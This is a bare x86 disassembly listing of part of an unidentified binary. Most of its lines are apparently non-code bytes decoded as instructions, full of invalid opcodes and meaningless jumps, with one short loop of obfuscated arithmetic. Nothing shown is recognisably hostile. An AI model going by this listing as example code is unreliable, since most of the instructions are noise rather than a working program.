  415e3d:	ins    DWORD PTR es:[edi],dx
  415e3e:	mov    dl,0xab
  415e40:	nop
  415e41:	out    0x5a,al
  415e43:	je     0x415df4
  415e45:	gs rcl ecx,cl
  415e48:	xchg   edx,eax
  415e49:	out    0x70,eax
  415e4b:	inc    ebp
  415e4c:	in     eax,0xad
  415e4e:	xchg   esi,eax
  415e4f:	jae    0x415dd8
  415e51:	shl    al,cl
  415e53:	test   BYTE PTR [esi-0x67],ch
  415e56:	and    BYTE PTR [esi-0x39fc714f],dh
  415e5c:	retf   0xd4f
  415e5f:	add    al,0x2
  415e61:	shr    BYTE PTR [esi],0x85
  415e64:	dec    esi
  415e65:	scas   al,BYTE PTR es:[edi]
  415e66:	mov    cl,0xa6
  415e68:	imul   ebx,eax,0x7f
  415e6b:	out    dx,eax
  415e6c:	inc    eax
  415e6d:	pushf  
  415e6e:	outs   dx,BYTE PTR ds:[esi]
  415e6f:	pop    es
  415e70:	(bad)  
  415e71:	aam    0x15
  415e73:	out    dx,eax
  415e74:	jmp    esp
  415e76:	pavgw  mm4,QWORD PTR [ecx+ebp*1-0x36]
  415e7b:	pop    eax
  415e7c:	push   0xc73c0a50
  415e81:	cmc    
  415e82:	(bad)  
  415e83:	pop    esi
  415e84:	add    esi,DWORD PTR [edx+0x49]
  415e87:	inc    eax
  415e88:	and    eax,0x7786dc3a
  415e8d:	icebp  
  415e8e:	push   edx
  415e8f:	in     eax,0x8d
  415e91:	jmp    0xd27d6920
  415e96:	icebp  
  415e97:	or     ebx,DWORD PTR [esi]
  415e99:	and    ah,ah
  415e9b:	jno    0x415f0f
  415e9d:	add    bl,BYTE PTR [ebx+esi*1+0x4995fcd6]
  415ea4:	scas   al,BYTE PTR es:[edi]
  415ea5:	dec    esp
  415ea6:	inc    edi
  415ea7:	ja     0x415e9b
  415ea9:	ins    BYTE PTR es:[edi],dx
  415eaa:	xor    eax,0x1fdb52eb
  415eaf:	pop    ebx
  415eb0:	pop    edi
  415eb1:	cmp    ecx,ebp
  415eb3:	cmp    al,0x76
  415eb5:	int    0xfb
  415eb7:	sbb    dh,bh
  415eb9:	aad    0xc0
  415ebb:	sbb    cl,BYTE PTR [eax+0x4e599d71]
  415ec1:	clc    
  415ec2:	xchg   esi,eax
  415ec3:	popf   
  415ec4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415ec5:	push   edi
  415ec6:	in     al,0xe9
  415ec8:	push   0xffffff9b
  415eca:	push   edi
  415ecb:	cwde   
  415ecc:	loopne 0x415e90
  415ece:	jecxz  0x415ed9
  415ed0:	adc    DWORD PTR [ebp-0x2b],ecx
  415ed3:	fst    QWORD PTR [edi-0x3b318f40]
  415ed9:	cwde   
  415eda:	add    BYTE PTR [esi],0x2d
  415edd:	jb     0x415e67
  415edf:	and    BYTE PTR [ecx-0x327f091f],0xf2
  415ee6:	and    eax,0xba83c9ca
  415eeb:	lds    eax,FWORD PTR [esi+0x6a3f4e9e]
  415ef1:	add    DWORD PTR [edx-0x65],ebp
  415ef4:	dec    edx
  415ef5:	and    DWORD PTR [edx+eax*8],ebp
  415ef8:	sti    
  415ef9:	fstp   DWORD PTR [ebp-0x53]
  415efc:	std    
  415efd:	shl    bh,0xeb
  415f00:	in     eax,dx
  415f01:	aas    
  415f02:	dec    eax
  415f03:	call   0x3f4b7ec0
  415f08:	fcom   QWORD PTR [ebp+0xa]
  415f0b:	std    
  415f0c:	test   BYTE PTR [eax+0x1e],ah
  415f0f:	into   
  415f10:	push   0xffffffaf
  415f12:	xchg   ecx,eax
  415f13:	loope  0x415e9f
  415f15:	inc    esi
  415f16:	test   eax,0xdeb56546
  415f1b:	cdq    
  415f1c:	aad    0xc
  415f1e:	or     BYTE PTR [edx-0x16],bl
  415f21:	adc    ebp,DWORD PTR [eax]
  415f23:	in     eax,0x3b
  415f25:	sub    eax,0xff8944ae
  415f2a:	loop   0x415f5e
  415f2c:	mov    eax,ds:0x6a427356
  415f31:	or     ebp,DWORD PTR [edi-0x6ac41bd4]
  415f37:	jbe    0x415f8a
  415f39:	outs   dx,BYTE PTR ds:[esi]
  415f3a:	mov    eax,ds:0x4a4f8a9
  415f3f:	(bad)  
  415f40:	inc    esi
  415f41:	enter  0x3c6e,0x35
  415f45:	cmp    eax,0xbd6f3b25
  415f4a:	dec    ebp
  415f4b:	fs setge ah
  415f4f:	cmp    al,0xda
  415f51:	inc    edi
  415f52:	mov    esp,0x4cfcee39
  415f57:	mov    ch,0xd0
  415f59:	ja     0x415f80
  415f5b:	stc    
  415f5c:	adc    eax,0xbfc2f576
  415f61:	push   esp
  415f62:	pop    es
  415f63:	das    
  415f64:	int3   
  415f65:	xor    DWORD PTR [ecx-0x21715398],eax
  415f6b:	jecxz  0x415f33
  415f6d:	sub    eax,0xea69b92b
  415f72:	jmp    0x1b1b784
  415f77:	shl    BYTE PTR [ebp+0xa],0x46
  415f7b:	scas   al,BYTE PTR es:[edi]
  415f7c:	push   es
  415f7d:	cmp    ah,BYTE PTR [edi-0x43]
  415f80:	or     BYTE PTR [edi-0x63],bh
  415f83:	test   al,0xda
  415f85:	es xchg edx,eax
  415f87:	fiadd  DWORD PTR [ecx-0x70]
  415f8a:	or     cl,bl
  415f8c:	out    0x3d,al
  415f8e:	and    BYTE PTR [eax+0x51],bl
  415f91:	into   
  415f92:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415f93:	ins    BYTE PTR es:[edi],dx
  415f94:	fisubr WORD PTR [ebp-0x8291d6]
  415f9a:	cmp    eax,0xf02643df
  415f9f:	repz popa 
  415fa1:	fs daa 
  415fa3:	cs push 0xa8282930
  415fa9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415faa:	push   ebp
  415fab:	sub    DWORD PTR [edx],ebp
  415fad:	add    al,0x10
  415faf:	and    ah,ch
  415fb1:	and    esp,ebx
  415fb3:	mov    ah,0x5b
  415fb5:	adc    BYTE PTR [edx+0xd],dh
  415fb8:	arpl   WORD PTR [ecx+0x4d],dx
  415fbb:	and    esi,edi
  415fbd:	xor    BYTE PTR [ecx-0x4c646cf4],bh
  415fc3:	imul   ebx,DWORD PTR [ebp-0x2e4219c5],0x2d
  415fca:	cs pop ds
  415fcc:	mov    ds:0xccb8a369,al
  415fd1:	fwait
  415fd2:	mov    BYTE PTR [edx],cl
  415fd4:	jno    0x415f76
  415fd6:	aas    
  415fd7:	fisttp QWORD PTR [ebx+ebx*8-0x56]
  415fdb:	jmp    FWORD PTR [ebp+ecx*4-0x68]
  415fdf:	sub    cl,BYTE PTR [ecx]
  415fe1:	jg     0x415f63
  415fe3:	mov    al,ds:0x97873205
  415fe8:	inc    esp
  415fe9:	push   esp
  415fea:	loopne 0x415fb0
  415fec:	xor    cl,BYTE PTR [eax+eax*2+0x786c53ff]
  415ff3:	and    ch,BYTE PTR [esi-0x2e]
  415ff6:	add    BYTE PTR ds:[eax-0x7e],bl
  415ffa:	and    DWORD PTR [esi-0x79ae1f36],edi
  416000:	push   edx
  416001:	out    dx,eax
  416002:	mov    ebx,0xab0777f9
  416007:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416008:	inc    ebp
  416009:	jne    0x415fa4
  41600b:	mov    dl,BYTE PTR [ebx]
  41600d:	mov    DWORD PTR [edi+0x7befbf09],0x7c314b43
  416017:	ficomp DWORD PTR [ebx+ebp*1-0x9]
  41601b:	fcomp  DWORD PTR ds:0xe3da6b34
  416021:	retf   
  416022:	push   ds
  416023:	cld    
  416024:	test   esi,0xbb03b8b
  41602a:	sti    
  41602b:	sbb    BYTE PTR [ebx],dl
  41602d:	fistp  QWORD PTR [ecx]
  41602f:	pushf  
  416030:	fist   DWORD PTR [esi+esi*2-0x1d355b60]
  416037:	popf   
  416038:	cmc    
  416039:	in     al,0x83
  41603b:	inc    esp
  41603c:	jp     0x41608f
  41603e:	loopne 0x416041
  416040:	mov    edx,0xcab6bacd
  416045:	data16 mov ?,WORD PTR [eax]
  416048:	ins    BYTE PTR es:[edi],dx
  416049:	jbe    0x41609e
  41604b:	bound  edx,QWORD PTR [ecx+ebp*8+0x33]
  41604f:	bnd je 0x416095
  416052:	add    BYTE PTR ds:0x8cf0,0x74
  416058:	mov    ecx,0x53dcdbbb
  41605d:	add    eax,DWORD PTR [edi]
  41605f:	popa   
  416060:	mov    ds:0x77941b6,al
  416065:	and    BYTE PTR [ecx],dl
  416067:	cmp    esp,edx
  416069:	cs inc ecx
  41606b:	add    DWORD PTR [eax],0x827bbd02
  416071:	jl     0x4160b7
  416073:	lods   eax,DWORD PTR ds:[esi]
  416074:	mov    ebp,0x80fa00c3
  416079:	fs dec esi
  41607b:	test   al,bh
  41607d:	jne    0x4160ad
  41607f:	mov    al,ds:0x46ebc59d
  416084:	sbb    eax,ebx
  416086:	dec    ebx
  416087:	dec    ecx
  416088:	jno    0x416015
  41608a:	ret    0xc53c
  41608d:	je     0x4160dc
  41608f:	gs stos DWORD PTR es:[edi],eax
  416091:	pop    edi
  416092:	(bad)  
  416094:	jne    0x41605f
  416096:	or     al,BYTE PTR [esi-0x66]
  416099:	mov    ds:0x409ac52e,eax
  41609e:	out    0x3a,al
  4160a0:	mov    cl,BYTE PTR ds:0x75d378b8
  4160a6:	test   eax,0xe2f63a00
  4160ab:	dec    edx
  4160ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4160ad:	sbb    DWORD PTR [ebx],0xffffffbc
  4160b0:	call   0x216972f5
  4160b5:	aas    
  4160b6:	sahf   
  4160b7:	mov    ebx,0x4ccdc506
  4160bc:	in     eax,dx
  4160bd:	jb     0x41607c
  4160bf:	inc    ecx
  4160c0:	add    eax,0xb436a5de
  4160c5:	test   al,ah
  4160c7:	push   eax
  4160c8:	cmp    eax,0x6b525894
  4160cd:	test   eax,0xcaf86449
  4160d2:	js     0x41614a
  4160d4:	pop    ds
  4160d5:	test   al,0xd4
  4160d7:	cmp    DWORD PTR cs:[ebp+edx*4+0x13],ecx
  4160dc:	out    0x4e,al
  4160de:	in     eax,0xeb
  4160e0:	inc    esp
  4160e1:	arpl   di,bp
  4160e3:	inc    ecx
  4160e4:	xor    DWORD PTR [ebp-0x16641ba8],edi
  4160ea:	shl    DWORD PTR [eax+0x79090aff],1
  4160f0:	jns    0x41614d
  4160f2:	not    DWORD PTR [edx+0x20]
  4160f5:	pop    eax
  4160f6:	enter  0xcae1,0xa2
  4160fa:	cmp    BYTE PTR [edx],dl
  4160fc:	shr    DWORD PTR [edx+0x35],1
  4160ff:	out    0x46,eax
  416101:	mov    ebx,0xf2603b43
  416106:	cld    
  416107:	retf   
  416108:	jns    0x4160f5
  41610a:	xor    ah,BYTE PTR gs:[edx-0x178e6189]
  416111:	mov    WORD PTR ds:0x3617766d,ds
  416117:	adc    bh,BYTE PTR [esi-0x15b1ebf2]
  41611d:	xor    al,0xf8
  41611f:	jo     0x4160a4
  416121:	dec    esp
  416122:	push   ecx
  416123:	push   edx
  416124:	jae    0x4160be
  416126:	lock aam 0x54
  416129:	jle    0x4160f6
  41612b:	xchg   esi,eax
  41612c:	xchg   ebx,eax
  41612d:	or     eax,DWORD PTR [ebx+0x29]
  416130:	mov    ds:0xd778aa27,al
  416135:	inc    ebx
  416136:	popf   
  416137:	shl    DWORD PTR [edx+0x3c],0x68
  41613b:	pop    DWORD PTR [ecx-0x27a22599]
  416141:	sub    BYTE PTR [edx],dl
  416143:	bound  esp,QWORD PTR [edi]
  416145:	adc    DWORD PTR [ebx],ebp
  416147:	sub    ecx,DWORD PTR [ebp-0x77]
  41614a:	pop    ebx
  41614b:	(bad)  
  41614c:	popa   
  41614d:	push   esi
  41614e:	and    al,0x2a
  416150:	pop    esi
  416151:	aaa    
  416152:	mov    ebp,0x733038ad
  416157:	sbb    BYTE PTR [eax],0xf3
  41615a:	xlat   BYTE PTR ds:[ebx]
  41615b:	cdq    
  41615c:	jl     0x4161aa
  41615e:	je     0x416185
  416160:	enter  0xe07f,0xd8
  416164:	push   ds
  416165:	and    BYTE PTR [esi],bl
  416167:	loope  0x416170
  416169:	cmp    al,0xd6
  41616b:	dec    ebp
  41616c:	add    dl,BYTE PTR [ecx+0x34]
  41616f:	sub    eax,0x193f954a
  416174:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416175:	in     al,dx
  416176:	inc    eax
  416177:	mov    al,ds:0x25b4a2a6
  41617c:	jmp    0xbb0b:0xc0db9d0
  416183:	dec    esi
  416184:	mov    WORD PTR [edi],ds
  416186:	outs   dx,DWORD PTR ds:[esi]
  416187:	gs mov eax,0x4e39c1e8
  41618d:	and    eax,0xfb89346d
  416192:	mov    ebx,0x719f02c4
  416197:	sub    BYTE PTR [edi+0x5c],0x4d
  41619b:	jae    0x4161a6
  41619d:	int3   
  41619e:	daa    
  41619f:	mov    ds:0xc0582dc4,eax
  4161a4:	push   ds
  4161a5:	pop    eax
  4161a6:	clc    
  4161a7:	(bad)  
  4161a8:	mov    edx,0x5ac70e06
  4161ad:	retf   0x5f0f
  4161b0:	inc    eax
  4161b1:	iret   
  4161b2:	sub    al,0xa4
  4161b4:	jmp    0xcc4e124b
  4161b9:	mov    ebx,0xa8e6a7a1
  4161be:	test   al,0x43
  4161c0:	aam    0x96
  4161c2:	leave  
  4161c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4161c4:	or     eax,0xc40f8f71
  4161c9:	pop    esi
  4161ca:	fld    QWORD PTR [ebx+0xe6df129]
  4161d0:	pop    ebx
  4161d1:	cmc    
  4161d2:	mov    ds:0xf205cc4a,eax
  4161d7:	mov    BYTE PTR [ecx+0x28],cl
  4161da:	jmp    0x4161e9
  4161dc:	cmp    DWORD PTR [edi+0x3d],eax
  4161df:	(bad)  
  4161e0:	pop    ecx
  4161e1:	outs   dx,BYTE PTR ds:[esi]
  4161e2:	jb     0x4161dc
  4161e4:	mov    ecx,0x5570c196
  4161e9:	jl     0x41620d
  4161eb:	sahf   
  4161ec:	daa    
  4161ed:	int3   
  4161ee:	clc    
  4161ef:	fs adc edi,ebx
  4161f2:	js     0x4161f9
  4161f4:	(bad)  
  4161f5:	adc    BYTE PTR [ebx],dh
  4161f7:	jecxz  0x416276
  4161f9:	dec    esp
  4161fa:	dec    esp
  4161fb:	jb     0x4161ce
  4161fd:	xchg   edi,eax
  4161fe:	xchg   ebp,eax
  4161ff:	xchg   ebp,eax
  416200:	fbld   TBYTE PTR [edx]
  416202:	xor    eax,0x30d6df48
  416207:	add    ah,al
  416209:	call   0x4cfa5110
  41620e:	sub    esi,DWORD PTR [esi+0x283d3a3c]
  416214:	cpuid  
  416216:	mov    al,0x94
  416218:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416219:	jmp    0x4161cb
  41621b:	sbb    esp,ebp
  41621d:	sub    BYTE PTR [ebp-0x75],dl
  416220:	popa   
  416221:	ds (bad) 
  416223:	sbb    BYTE PTR [ecx],bl
  416225:	stos   DWORD PTR es:[edi],eax
  416226:	mov    ds:0xe45c7b4b,al
  41622b:	lods   eax,DWORD PTR ds:[esi]
  41622c:	clc    
  41622d:	or     bh,BYTE PTR [edi+0x29f45a25]
  416233:	mov    WORD PTR ds:0x1f6a1c98,cs
  416239:	call   0x504b:0x1d6732a6
  416240:	or     ebp,0x2f
  416243:	retf   
  416244:	leave  
  416245:	mov    dl,0x38
  416247:	xor    edi,edi
  416249:	fadd   st(2),st
  41624b:	cmp    DWORD PTR [eax],eax
  41624d:	sbb    al,0xc2
  41624f:	scas   eax,DWORD PTR es:[edi]
  416250:	dec    edx
  416251:	sbb    ebx,DWORD PTR [ebp+0x1944e334]
  416257:	sbb    BYTE PTR [ecx-0x18],al
  41625a:	gs clc 
  41625c:	dec    esp
  41625d:	mov    dl,ch
  41625f:	jle    0x4161f0
  416261:	mov    esp,eax
  416263:	push   esp
  416264:	push   edx
  416265:	in     eax,0xb9
  416267:	cs clc 
  416269:	or     ebp,esi
  41626b:	in     eax,dx
  41626c:	fld    DWORD PTR [edi-0x45]
  41626f:	movsx  ecx,BYTE PTR [edx]
  416272:	dec    DWORD PTR [eax-0x624c4ec3]
  416278:	inc    esp
  416279:	sub    BYTE PTR [eax-0x3e],ch
  41627c:	dec    edi
  41627d:	and    BYTE PTR [ebp-0x70c2ec84],bh
  416283:	inc    eax
  416284:	and    ax,0x242e
  416288:	xor    ah,al
  41628a:	clc    
  41628b:	add    DWORD PTR [ecx+0x6e],esp
  41628e:	loope  0x416299
  416290:	cmp    ebx,edx
  416292:	jmp    0xee25483a
  416297:	rep lods al,BYTE PTR ds:[esi]
  416299:	mov    DWORD PTR [ebp-0x58],edx
  41629c:	mov    edx,DWORD PTR [ebp+0x8]
  41629f:	mov    ebx,DWORD PTR [ebp-0x54]
  4162a2:	add    edx,0x64f8da
  4162a8:	or     edx,ebx
  4162aa:	mov    DWORD PTR [ebp-0x54],edx
  4162ad:	mov    edx,DWORD PTR [ebp+0x8]
  4162b0:	mov    ebx,DWORD PTR [ebp-0x50]
  4162b3:	add    edx,ecx
  4162b5:	xor    edx,ebx
  4162b7:	mov    DWORD PTR [ebp-0x50],edx
  4162ba:	mov    edx,DWORD PTR [ebp+0x8]
  4162bd:	mov    ebx,DWORD PTR [ebp-0x4c]
  4162c0:	add    edx,edi
  4162c2:	and    edx,ebx
  4162c4:	mov    DWORD PTR [ebp-0x4c],edx
  4162c7:	mov    edx,DWORD PTR [ebp+0x8]
  4162ca:	mov    ebx,DWORD PTR [ebp-0x48]
  4162cd:	lea    edx,[ebx+edx*1+0x241fc1f]
  4162d4:	mov    DWORD PTR [ebp-0x48],edx
  4162d7:	mov    edx,DWORD PTR [ebp+0x8]
  4162da:	mov    ebx,0xfa5e15e2
  4162df:	sub    ebx,edx
  4162e1:	add    ebx,DWORD PTR [ebp-0x44]
  4162e4:	mov    DWORD PTR [ebp-0x44],ebx
  4162e7:	mov    edx,DWORD PTR [ebp+0x8]
  4162ea:	xor    edx,eax
  4162ec:	add    edx,esi
  4162ee:	jne    0x413ef1
  4162f4:	mov    edx,DWORD PTR [ebp-0x14]
  4162f7:	mov    DWORD PTR [ebp+0x8],edx
  4162fa:	jmp    0x41636f
  4162ff:	mov    edx,DWORD PTR [ebp+0x8]
  416302:	mov    ebx,DWORD PTR [ebp-0x8]
  416305:	xor    edx,eax
  416307:	xor    ebx,eax
  416309:	sub    edx,ebx
  41630b:	sub    edx,esi
  41630d:	xor    edx,eax
  41630f:	mov    DWORD PTR [ebp+0x8],edx
  416312:	mov    edx,DWORD PTR [ebp+0x8]
  416315:	mov    ebx,DWORD PTR [ebp-0x58]
  416318:	add    edx,0x5708f8
  41631e:	imul   edx,ebx
  416321:	mov    DWORD PTR [ebp-0x58],edx
  416324:	mov    edx,DWORD PTR [ebp+0x8]
  416327:	mov    ebx,DWORD PTR [ebp-0x54]
  41632a:	add    edx,0x64f8da
  416330:	or     edx,ebx
  416332:	mov    DWORD PTR [ebp-0x54],edx
  416335:	mov    edx,DWORD PTR [ebp+0x8]
  416338:	mov    ebx,DWORD PTR [ebp-0x50]
  41633b:	add    edx,ecx
  41633d:	xor    edx,ebx
  41633f:	mov    DWORD PTR [ebp-0x50],edx
  416342:	mov    edx,DWORD PTR [ebp+0x8]
  416345:	mov    ebx,DWORD PTR [ebp-0x4c]
  416348:	add    edx,edi
  41634a:	and    edx,ebx
  41634c:	mov    DWORD PTR [ebp-0x4c],edx
  41634f:	mov    edx,DWORD PTR [ebp+0x8]
  416352:	mov    ebx,DWORD PTR [ebp-0x48]
  416355:	lea    edx,[ebx+edx*1+0x241fc1f]
  41635c:	mov    DWORD PTR [ebp-0x48],edx
  41635f:	mov    edx,DWORD PTR [ebp+0x8]
  416362:	mov    ebx,0xfa5e15e2
  416367:	sub    ebx,edx
  416369:	add    ebx,DWORD PTR [ebp-0x44]
  41636c:	mov    DWORD PTR [ebp-0x44],ebx
  41636f:	mov    edx,DWORD PTR [ebp+0x8]
  416372:	xor    edx,eax
  416374:	add    edx,esi
  416376:	jne    0x4162ff
  41637c:	mov    edx,DWORD PTR [ebp-0x8]
  41637f:	mov    ebx,DWORD PTR [ebp-0xc]
  416382:	jmp    0x418708
  416387:	nop
  416388:	test   BYTE PTR [ebp-0x643e8c3e],0xf4
  41638f:	add    DWORD PTR [ebp-0x5d],esp
  416392:	out    0xe0,eax
  416394:	shr    BYTE PTR [esi-0x71],0x5c
  416398:	push   edi
  416399:	jns    0x416415
  41639b:	add    DWORD PTR [edi+0x7a],ebx
  41639e:	jp     0x4163f4
  4163a0:	mov    al,0xf8
  4163a2:	sub    BYTE PTR [ecx+0x7a],0x6c
  4163a6:	es xor eax,0x2189a74d
  4163ac:	pop    es
  4163ad:	mov    edi,0x9f23940e
  4163b2:	jne    0x4163df
  4163b4:	fs push esi
  4163b6:	(bad)  
  4163b7:	(bad)  
  4163b8:	sub    al,0x4f
  4163ba:	gs addr16 retf 0x4791
  4163bf:	push   ss
  4163c0:	sar    BYTE PTR [ebx-0x4b4d51cd],0xa
  4163c7:	mov    cl,0x21
  4163c9:	cmp    al,0x73
  4163cb:	ja     0x4163a6
  4163cd:	iret   
  4163ce:	sbb    DWORD PTR [ebx-0x2e],edx
  4163d1:	adc    ecx,DWORD PTR [edi+0x48acee7e]
  4163d7:	push   0x60
  4163d9:	pop    edx
  4163da:	push   0x4edcb3af
  4163df:	add    eax,0x379c0d1f
  4163e4:	neg    BYTE PTR [esi+ecx*4+0x7]
  4163e8:	pop    ds
  4163e9:	stos   DWORD PTR es:[edi],eax
  4163ea:	(bad)  
  4163eb:	cli    
  4163ec:	xchg   esp,eax
  4163ed:	push   esp
  4163ee:	push   ss
  4163ef:	test   DWORD PTR [edi+0x2a],ecx
  4163f2:	mov    BYTE PTR [edi-0x1c],dh
  4163f5:	iret   
  4163f6:	shl    BYTE PTR [esi],0x52
  4163f9:	loope  0x41646c
  4163fb:	xchg   ebx,eax
  4163fc:	mov    DWORD PTR [esp+ebx*4-0x1af4291a],edx
  416403:	dec    ecx
  416404:	dec    ebx
  416405:	pop    edi
  416406:	adc    dl,ch
  416408:	iret   
  416409:	es mov edx,0x67b68600
  41640f:	stos   DWORD PTR es:[edi],eax
  416410:	xchg   edi,eax
  416411:	and    eax,0x1119de7f
  416416:	les    eax,FWORD PTR [edx+0x6def7e94]
  41641c:	push   edx
  41641d:	and    al,0xe8
  41641f:	dec    esp
  416420:	fidivr WORD PTR [ebp-0x5a]
  416423:	int3   
  416424:	xor    eax,0xc3e33ceb
  416429:	mov    ch,0xf3
  41642b:	and    ebx,DWORD PTR ds:0x4c59eefb
  416431:	push   es
  416432:	add    edi,eax
  416434:	pop    ebx
  416435:	cs cdq 
  416437:	fadd   DWORD PTR [esi]
  416439:	nop
  41643a:	loope  0x4164ab
  41643c:	dec    ch
  41643e:	push   edi
  41643f:	add    dl,al
  416441:	mov    edi,DWORD PTR [eax]
  416443:	(bad)  
  416444:	jle    0x4164a3
  416446:	pusha  
  416447:	or     DWORD PTR [ebx],esi
  416449:	loopne 0x416491
  41644b:	add    esi,edi
  41644d:	and    eax,0xf710a6b0
  416452:	cmc    
  416453:	popf   
  416454:	cli    
  416455:	(bad)  
  416456:	call   0xfd503ad3
  41645b:	pop    ss
  41645c:	stos   BYTE PTR es:[edi],al
  41645d:	fiadd  DWORD PTR [esp+edi*8-0x6b4a7a5c]
  416464:	in     eax,0xdb
  416466:	xchg   edx,eax
  416467:	test   eax,0x2bd765ec
  41646c:	mov    ebx,0x72dafcf8
  416471:	add    bl,BYTE PTR [edi]
  416473:	jb     0x416496
  416475:	dec    ecx
  416476:	xor    BYTE PTR [ebp-0x4],ch
  416479:	pop    esp
  41647a:	jecxz  0x41648a
  41647c:	sti    
  41647d:	stos   DWORD PTR es:[edi],eax
  41647e:	add    ebx,eax
  416480:	in     eax,dx
  416481:	inc    edi
  416482:	(bad)  
  416483:	lods   eax,DWORD PTR ds:[esi]
  416484:	xor    ah,BYTE PTR [ebp-0x58d5a44a]
  41648a:	push   edi
  41648b:	xchg   edx,eax
  41648c:	cmp    esp,DWORD PTR [ecx+0x5f793fd3]
  416492:	popf   
  416493:	xor    BYTE PTR [ebx+0x33],ah
  416496:	xchg   ebx,eax
  416497:	int3   
  416498:	fnstenv [edi+edi*2+0x41]
  41649c:	sbb    ch,bh
  41649e:	xor    al,0xd1
  4164a0:	stc    
  4164a1:	sub    eax,0x4700a44c
  4164a6:	gs jmp 0x4164a5
  4164a9:	je     0x41650d
  4164ab:	add    eax,ecx
  4164ad:	ins    DWORD PTR es:[edi],dx
  4164ae:	dec    edx
  4164af:	pop    ds
  4164b0:	sub    ecx,DWORD PTR [ebx-0x1d3aa5a9]
  4164b6:	dec    ebx
  4164b7:	mov    ecx,DWORD PTR [edi+0x5d]
  4164ba:	push   ebx
  4164bb:	push   0xefd16fff
  4164c0:	mov    cl,0x47
  4164c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4164c3:	pop    esi
  4164c4:	or     esp,DWORD PTR [esi+0x48]
  4164c7:	push   0xc
  4164c9:	xchg   esi,eax
  4164ca:	push   esi
  4164cb:	popa   
  4164cc:	out    dx,eax
  4164cd:	pop    ebp
  4164ce:	xchg   esi,eax
  4164cf:	add    eax,0x72e6dd4e
  4164d4:	sub    DWORD PTR [edx-0x46],esp
  4164d7:	data16 adc dl,BYTE PTR [ebx+0x4cae1966]
  4164de:	add    eax,0x461163f1
  4164e3:	retf   
  4164e4:	push   es
  4164e5:	(bad)  
  4164e6:	stos   DWORD PTR es:[edi],eax
  4164e7:	pop    esp
  4164e8:	clc    
  4164e9:	xchg   edi,eax
  4164ea:	call   0xb345b7d3
  4164ef:	pop    ebx
  4164f0:	(bad)  
  4164f2:	xchg   edx,eax
  4164f3:	sti    
  4164f4:	push   ebx
  4164f5:	sub    ah,BYTE PTR [edi-0x454dd424]
  4164fb:	mov    ah,0xf1
  4164fd:	and    BYTE PTR [edi+0x3b6bc94],cl
  416503:	mov    ds:0xbd6465dd,al
  416508:	in     eax,0x79
  41650a:	xchg   esi,eax
  41650b:	bound  ebx,QWORD PTR [ebp+0x7d]
  41650e:	sbb    esp,DWORD PTR [edx-0x51]
  416511:	or     eax,0xc4c4e466
  416516:	arpl   bp,dx
  416518:	mov    ch,0x68
  41651a:	add    edx,esp
  41651c:	push   cs
  41651d:	jb     0x41658a
  41651f:	xchg   edi,eax
  416520:	das    
  416521:	pop    ecx
  416522:	clc    
  416523:	js     0x41657d
  416525:	cmp    eax,0x4297bea2
  41652a:	ret    
  41652b:	dec    edx
  41652c:	cli    
  41652d:	xchg   DWORD PTR [edi+ecx*2+0x35],edi
  416531:	bsf    esi,DWORD PTR [ebx-0x179b8370]
  416538:	test   DWORD PTR [eax],ecx
  41653a:	jl     0x416551
  41653c:	xchg   ebx,eax
  41653d:	das    
  41653e:	mov    cl,0x1
  416540:	fcomp  st(1)
  416542:	push   0x21023cbc
  416547:	fld    TBYTE PTR [eax+eiz*4]
  41654a:	or     ebx,DWORD PTR [eax+ecx*4]
  41654d:	int    0xdb
  41654f:	push   0xcf743118
  416554:	xor    eax,0xa712edb9
  416559:	sub    DWORD PTR [ebp+0xa],esi
  41655c:	mov    ebx,0x108ec066
  416561:	and    edx,ebx
  416563:	fisubr DWORD PTR [edx+0x4187fe81]
  416569:	xchg   esi,eax
  41656a:	jle    0x4165e2
  41656c:	fs (bad) 
  41656e:	push   ebx
  41656f:	nop    DWORD PTR ds:[ecx]
  416573:	jp     0x4165bb
  416575:	add    esi,0x94b660f4
  41657b:	test   eax,0x54ce2cd3
  416580:	adc    al,0xc5
  416582:	(bad)  
  416583:	loop   0x41656e
  416585:	xchg   ebx,eax
  416586:	add    eax,0xbb05e68
  41658b:	adc    eax,0x533245e5
  416590:	in     eax,dx
  416591:	jae    0x4165b1
  416593:	dec    eax
  416594:	fldcw  WORD PTR [eax]
  416596:	cli    
  416597:	cdq    
  416598:	pushf  
  416599:	out    dx,eax
  41659a:	pop    es
  41659b:	icebp  
  41659c:	arpl   di,cx
  41659e:	pop    edx
  41659f:	mov    ecx,0x1d774504
  4165a4:	loop   0x416536
  4165a6:	shr    BYTE PTR [ebx+0x3f21f447],1
  4165ac:	js     0x416596
  4165ae:	sub    bl,BYTE PTR [ebp+0x69]
  4165b1:	push   es
  4165b2:	jle    0x416630
  4165b4:	out    dx,eax
  4165b5:	call   0xe28f8cd6
  4165ba:	and    eax,0xc80ac4cf
  4165bf:	shl    BYTE PTR [ebx],cl
  4165c1:	lea    ecx,[ecx-0xe2a7d73]
  4165c7:	hlt    
  4165c8:	jns    0x4165b9
  4165ca:	inc    ebp
  4165cb:	loope  0x4165e5
  4165cd:	in     al,dx
  4165ce:	fs out dx,eax
  4165d0:	fst    st(6)
  4165d2:	lods   eax,DWORD PTR ds:[esi]
  4165d3:	jp     0x4165e6
  4165d5:	hlt    
  4165d6:	jg     0x416558
  4165d8:	push   esp
  4165d9:	sub    eax,0xaff01d50
  4165de:	xor    esi,eax
  4165e0:	std    
  4165e1:	push   0xffffffae
  4165e3:	adc    al,0x2f
  4165e5:	or     BYTE PTR [edx],dh
  4165e7:	xor    DWORD PTR [edx],edi
  4165e9:	dec    eax
  4165ea:	jp     0x41662c
  4165ec:	mov    al,ds:0x224f07fd
  4165f1:	shr    DWORD PTR [eax],1
  4165f3:	sbb    al,0x1d
  4165f5:	xchg   esp,eax
  4165f6:	in     al,0x23
  4165f8:	shl    DWORD PTR [ebx+0x6b],cl
  4165fb:	icebp  
  4165fc:	cmp    esi,esi
  4165fe:	jo     0x41664d
  416600:	add    ebp,DWORD PTR [esi+0x3a215a8]
  416606:	cwde   
  416607:	mov    edi,0x328db2a4
  41660c:	hlt    
  41660d:	loop   0x4165d2
